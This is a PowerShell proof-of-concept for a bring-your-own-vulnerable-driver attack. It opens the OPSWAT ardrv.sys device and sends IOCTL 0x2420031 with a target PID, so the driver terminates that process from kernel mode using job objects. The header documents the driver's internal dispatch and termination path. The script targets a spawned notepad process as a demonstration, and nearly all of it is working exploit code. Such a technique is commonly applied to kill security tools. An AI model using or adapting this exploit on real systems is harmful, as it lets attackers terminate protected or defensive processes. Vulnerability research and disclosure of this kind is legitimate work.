<#
    .SYNOPSIS
        Execution Flow Summary: ardrv.sys Arbitrary Process Termination via Job Objects (BYOVD)
        
    .DESCRIPTION
        1. User-Mode: App sends DeviceIoControl with IOCTL 0x2420031 and a 4-byte buffer containing the Target PID.
        2. Central Dispatch (sub_11258): Driver verifies IRQL == 0 and parses the IOCTL offset to route to sub_11008.
        3. Process Lookup & Handle (sub_11008): Resolves the target PID via PsLookupProcessByProcessId and 
           obtains a process object reference using ObOpenObjectByPointer.
        4. Job Object Termination: Creates a new kernel job object (ZwCreateJobObject), assigns the target process 
           to it (ZwAssignProcessToJobObject), and forces termination via ZwTerminateJobObject.
#>

Clear-Host
Write-Host "[*] Starting ardrv.sys IOCTL client proof-of-concept (Job Object Termination)..." -ForegroundColor Cyan

try {
    # 1. Open a handle to the OPSWAT ardrv driver device symbolic link
    $Handle = Get-FileHandle -FileName "ardrv" 

    $TargetProc = Start-Process notepad -PassThru 
    $TargetPID  = $TargetProc.Id
    Write-Host "[+] Target Process spawned with PID: $TargetPID" -ForegroundColor Green

    Write-Host "[*] Sending IOCTL 0x2420031 to terminate PID $TargetPID via Job Objects..." -ForegroundColor Yellow
    $inOutPtr = New-IntPtr -Size 4 -TypeSize ([Int32]) -Values ($TargetPID)
    Invoke-IoctlCall -Mode 0 -FileHandle $Handle -IoCtrlCode 0x2420031 -InOutPtr $inOutPtr -InputSize 4 -OutputSize 0

    Write-Host "[+] IOCTL executed successfully. Process should be terminated." -ForegroundColor Green
}
catch {
    Write-Error "[-] Error occurred during IOCTL execution: $_"
}
finally {
    if ($inOutPtr) {
        Free-IntPtr $inOutPtr -Method Auto
    }
    if ($Handle) {
        Free-IntPtr $Handle -Method NtHandle
        Write-Host "[*] Driver handle closed." -ForegroundColor Gray
    }
}